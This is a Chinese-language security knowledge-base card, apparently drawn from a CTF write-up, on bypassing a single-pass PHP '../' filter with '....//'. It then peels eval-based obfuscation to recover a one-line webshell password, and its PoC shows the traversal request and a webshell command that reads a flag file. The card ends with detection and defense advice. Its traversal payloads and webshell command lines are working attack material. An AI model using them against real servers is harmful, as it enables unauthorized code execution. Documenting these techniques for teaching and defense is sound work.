---
id: web-php-file-inclusion-doublewrite-lfi-eval-chain-webshell
title: PHP 文件包含 `../` 被单次替换 → `....//` 双写绕过读源码，再逐层把 eval 改 echo 脱混淆取一句话木马密码拿 RCE
type: scenario
domain: web
path: web/php/file-inclusion
technique: php-lfi-doublewrite-bypass-eval-chain-deobfuscate-webshell
tags:
- php
- file-inclusion
- lfi
- filter-bypass
- double-write
- obfuscation
- webshell
- rce
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W3
  verified_at: '2026-11-08T19:36:51+08:00'
  notes: 已对照原文核对；本次核对未读取图片；....//hackme.php 双写、逐层把 eval 改 echo 脱混淆取一句话木马、cmd[66.99] 数组传参绕过点号归一、/var/run/log/<hash>/flag 位置均与正文一致；原文未给出被包含文件的具体过滤实现（只说有过滤、双写可绕），卡片以单次替换/删除为典型解释属合理推断；
url: /docs/web/php/file-inclusion/web-php-file-inclusion-doublewrite-lfi-eval-chain-webshell/
draft: false
kb_aliases:
- '....//hackme.php'
- 双写绕过 ../ 过滤
- 文件包含双写绕过
- eval 改 echo 脱混淆
- 一句话木马密码还原
- 参数名带点用数组传参
---

## 一句话结论

包含参数把 `../` 做**单次**字符串替换（或黑名单删除）时，提交 `....//hackme.php` 删掉中间的 `../` 后仍还原出 `../hackme.php`，于是能读上级目录；读到的被混淆 PHP 若是一层层 `eval(base64_decode(...))`，把每层 `eval` 改成 `echo` 就能逐层剥出真正的 `<?php @eval($_POST['cmd_xxx']); ?>`，其参数名含点号时用 `cmd[66.99]` 数组形式传参即可连上执行命令。

## 原理

- **单次替换不递归**：过滤 `str_replace('../','', $f)`（或只匹配一次的正则）本质上只删一层；`....//` = `..` + `../` + `/` 的结构中删掉中间的 `../` 后剩余 `../`，路径穿越被还原。凡「删/替换后不再复查结果」的过滤器都可这样套：`..././`、`..%2f./`、`....//` 各有对应写法。
- **为什么需要先读源码**：目标只暴露 `?file=` 一个入口，flag 在 `../hackme.php` 之后的一层壳里；不含到源码就无法知道壳的层数和密码，因此「绕过过滤读到源码」是整条链的前置原语，而不是终点。
- **逐层剥壳**：混淆器典型结构是 `$a=urldecode("..."); $f=$a{3}.$a{6}...; eval($f("<base64>"));`。`eval` 与 `echo` 同参数，把最外层 `eval(` 改成 `echo(` 就打印出下一层的 PHP 源码（含新的 base64 串），把源码拷进本地文件、改掉 `highlight_file` 再执行，如此反复直到出现一句话木马。
- **密码即载荷**：脱到最里层得到 `<?php @eval($_POST['cmd_66.99']); ?>`；PHP 会把请求参数名里的 `.` 转成 `_`，直接 `cmd_66.99=...` 与木马里的键对不上，用 `cmd[66.99]=whoami` 以数组形式提交才命中 `$_POST['cmd_66.99']`。

## 触发条件

- 存在 `include`/`require` 拼接用户参数（典型 `index.php?file=`）。
- 过滤只做一次 `../` 删除/替换，或黑名单替换后不复查。
- 被包含文件是 `eval` 套娃式混淆，且 `disable_functions` 未禁用命令执行（或有绕过手段）。

## 利用步骤

1. `?file=../hackme.php` 被拦（或无回显），改 `?file=....//hackme.php` 读上级目录文件；`....//` 与 `..././`、`..%2f` 逐个试，命中取决于过滤器是删除还是替换。
2. 拿到混淆源码后本地重放：把 `highlight_file(__FILE__);` 注释掉，把最外层 `eval($X(...))` 改为 `echo $X(...)`，用 `php` CLI 跑或起本地服务访问，得到下一层代码。
3. 重复第 2 步直到出现 `<?php @eval($_POST['<key>']); ?>`，记下 key。
4. 上传同名木马文件到可访问目录（或直接用已还原出的木马文件路径）后，用 WebShell 管理工具/curl 以 `key` 作为参数名发命令；key 含 `.` 时用 `key[原字符串]` 的数组写法。
5. 在 WebShell 里翻目录取目标文件（本例在 `/var/run/log/<hash>/flag` 这类位置）。

## PoC

```text
GET /index.php?file=....//hackme.php HTTP/1.1
```

脱壳（本地，逐层替换 eval → echo）：

```php
<?php
// 第 1 层：原文件外层
$lapUCm = urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928...");
$f = $lapUCm{3}.$lapUCm{6}.$lapUCm{33}.$lapUCm{30};   // = "base64_decode"（层内按位拼出）
// 把 eval($f("<payload>")) 改成 echo $f("<payload>") 即得下一层
```

拿到的密码与传参（key 含点）：

```text
POST /hackme.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

cmd[66.99]=cat /var/run/log/*/flag
```

（等价写法 `cmd%5B66.99%5D=...`；不带中括号时 PHP 把 `.` 归一成 `_`，`$_POST['cmd_66.99']` 取不到值。）

## 变体与关联

- 过滤变体：只删 `../` → `....//`；删 `..` → `..././`；替换 `../` 为空 → 同样是单次替换，可用 `....//`；正则 `\.\.\/` 无 `/g` 时同上；`%2e%2e%2f` 用于「先校验后解码」的顺序问题。
- 脱壳变体：`assert`、`create_function`、`preg_replace /e`、`call_user_func` 套娃；`eval` 改 `echo` 通用，若被 `@` 抑制可改 `var_dump`。
- 密码变体：`$_POST[$_GET['k']]` 之类的二次取值木马，需同时带 `k=`；含点、含减号的键一律用数组语法 `k[原样]`。
- 关联：先删后解码类绕过、以及 Go `strings.NewReplacer` 单次替换类绕过属同一原理（过滤器只作用一次、结果不复查）。

## 检测与防御

- 不要拼接用户输入做 `include`；必须动态包含时用白名单映射（`['home'=>'pages/home.php']`）。
- 过滤后必须复查：先解码再规范化路径（`realpath`）并校验前缀在允许目录内，禁止 `..`、绝对路径、伪协议。
- 禁止源码目录可被包含/可读；`open_basedir` 限制、生产环境 `display_errors=Off`。
- 检测：请求参数中出现 `....//`、`..././`、`%2e%2e`、`php://filter`；web 目录内出现 `eval($_POST[...])` 形态文件（文件完整性监控）；日志里同一 IP 对 `?file=` 的连续递增目录探测。
